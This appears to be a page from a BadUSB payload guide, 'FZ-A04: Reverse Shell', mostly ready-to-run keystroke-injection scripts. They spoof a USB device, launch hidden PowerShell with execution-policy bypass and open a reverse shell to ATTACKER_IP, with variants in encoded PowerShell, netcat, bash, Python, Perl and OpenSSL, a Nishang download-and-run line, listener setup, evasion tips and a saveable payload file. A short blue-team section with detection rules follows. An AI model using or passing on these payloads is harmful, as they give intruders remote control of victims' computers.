# FZ-A04: Reverse Shell

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A04 |
| **Name** | Reverse Shell |
| **Difficulty** | Advanced |
| **Target OS** | Multi-Platform |
| **Execution Time** | ~4 seconds |
| **Network** | Requires outbound connectivity |
| **MITRE ATT&CK** | T1059 (Command and Scripting Interpreter) |

## What This Payload Does

Establishes a reverse shell connection from the target system back to an attacker-controlled listener. This provides interactive command-line access to the compromised system.

---

## Understanding Reverse Shells

### Reverse vs Bind Shell

```
REVERSE SHELL:                      BIND SHELL:

Target ────────► Attacker           Attacker ────────► Target
     Connects out                        Connects to target

Advantages:                         Disadvantages:
• Bypasses NAT                      • Blocked by target firewall
• Bypasses inbound firewall         • Target needs public IP
• Common outbound ports             • More easily detected
```

### Network Flow

```
┌──────────────┐                    ┌──────────────┐
│    Target    │                    │   Attacker   │
│              │ ─── TCP/4444 ───►  │              │
│  (Victim)    │                    │  (Listener)  │
│              │ ◄─── Commands ───  │              │
│              │ ─── Output ─────►  │              │
└──────────────┘                    └──────────────┘
```

---

## The Payload

### Windows PowerShell Reverse Shell

```ducky
REM =============================================
REM ADVANCED: PowerShell Reverse Shell
REM Target: Windows 10/11
REM Action: Establishes reverse shell
REM Requires: Attacker listener on port 4444
REM Skill: Advanced
REM WARNING: Creates remote access
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM PowerShell Reverse Shell
STRINGLN $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444)
STRINGLN $stream = $client.GetStream()
STRINGLN [byte[]]$bytes = 0..65535|%{0}
STRINGLN while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
STRINGLN $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
STRINGLN $sendback = (iex $data 2>&1 | Out-String )
STRINGLN $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
STRINGLN $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
STRINGLN $stream.Write($sendbyte,0,$sendbyte.Length)
STRINGLN $stream.Flush()}
STRINGLN $client.Close()
```

---

## Reverse Shell Variants

### Windows - PowerShell One-Liner

```ducky
STRINGLN powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

### Windows - Encoded PowerShell

```powershell
# Encode the reverse shell
$cmd = '$c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
# Use: powershell -ep bypass -enc $encoded
```

### Windows - Netcat

```ducky
REM If nc.exe is available
STRINGLN nc.exe ATTACKER_IP 4444 -e cmd.exe
```

### Windows - Nishang

```ducky
STRINGLN IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
```

---

## Cross-Platform Reverse Shells

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Bash reverse shell
STRINGLN bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### macOS - Python (if available)

```ducky
STRINGLN python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Bash reverse shell
STRINGLN bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Linux - Netcat

```ducky
REM Traditional netcat
STRINGLN nc -e /bin/bash ATTACKER_IP 4444

REM Netcat without -e
STRINGLN rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Linux - Python

```ducky
STRINGLN python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Linux - Perl

```ducky
STRINGLN perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM Install netcat if needed
STRINGLN pkg install netcat-openbsd -y
STRINGLN nc ATTACKER_IP 4444 -e /bin/bash
```

### iOS

iOS does not support reverse shells via BadUSB due to sandbox restrictions.

---

## Listener Setup

### Netcat Listener

```bash
# Basic listener
nc -lvnp 4444

# With line editing (rlwrap)
rlwrap nc -lvnp 4444
```

### Metasploit Multi-Handler

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

### Powercat Listener

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -l -p 4444
```

### Python Listener

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
print(f'Connected by {addr}')
while True:
    cmd = input('> ')
    conn.send(cmd.encode())
    data = conn.recv(4096)
    print(data.decode())
```

---

## Shell Upgrades

### TTY Shell (Linux)

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then background and stty
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### PowerShell Interactive

```powershell
# Improve shell capabilities
$Host.UI.RawUI.WindowTitle = "PS Shell"
Set-PSReadLineOption -HistoryNoDuplicates
```

---

## Red Team Perspective

### Port Selection

| Port | Rationale |
|------|-----------|
| 80 | HTTP - often allowed |
| 443 | HTTPS - often allowed |
| 53 | DNS - sometimes allowed |
| 4444 | Traditional (obvious) |
| 8080 | Alt HTTP |

### Evasion Techniques

1. **Use common ports** (80, 443)
2. **Encrypt traffic** (SSL shells)
3. **DNS exfiltration** if TCP blocked
4. **ICMP shells** if allowed

### Attack Chain

```
Payload Execution → Reverse Shell → Post-Exploitation → Persistence
                          ↑
                      You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Network Connections**
   - PowerShell with outbound connections
   - Unusual parent-child relationships

2. **Process Activity**
   - PowerShell spawning network connections
   - cmd.exe with network activity

3. **Command Line**
   - Base64 encoded commands
   - Network socket creation

### Detection Script

```powershell
# Find PowerShell with network connections
Get-NetTCPConnection | Where-Object {
    (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName -eq 'powershell'
} | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, State
```

### Sigma Rule

```yaml
title: Reverse Shell Detection
status: experimental
description: Detects potential reverse shell activity
logsource:
    product: windows
    category: process_creation
detection:
    selection_ps:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Net.Sockets.TCPClient'
            - 'System.Net.Sockets'
            - 'IO.StreamReader'
    selection_cmd:
        Image|endswith: '\cmd.exe'
        ParentImage|endswith: '\powershell.exe'
    condition: selection_ps or selection_cmd
level: high
tags:
    - attack.execution
    - attack.command_and_control
```

### Prevention

1. **Outbound Filtering**
   - Restrict egress traffic
   - Application-level filtering

2. **Endpoint Protection**
   - Monitor for shell behavior
   - Block known shell patterns

3. **Network Monitoring**
   - IDS/IPS rules for shells
   - Traffic analysis

---

## Practice Exercises

### Exercise 1: Setup Listener
```bash
nc -lvnp 4444
```

### Exercise 2: Test Connectivity
Before deploying, verify connectivity:
```powershell
Test-NetConnection -ComputerName ATTACKER_IP -Port 4444
```

### Exercise 3: Encrypted Shell
Using OpenSSL for encryption:
```bash
# Listener
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Target
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s
```

---

## Payload File

Save as `FZ-A04_Reverse_Shell.txt`:

```ducky
REM FZ-A04: Reverse Shell (PowerShell)
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length)};$c.Close()
```

---

[← FZ-A03 Credential Dumping](FZ-A03_Credential_Dumping.md) | [Back to Advanced](README.md) | [Next: FZ-A05 Data Exfiltration →](FZ-A05_Data_Exfiltration.md)
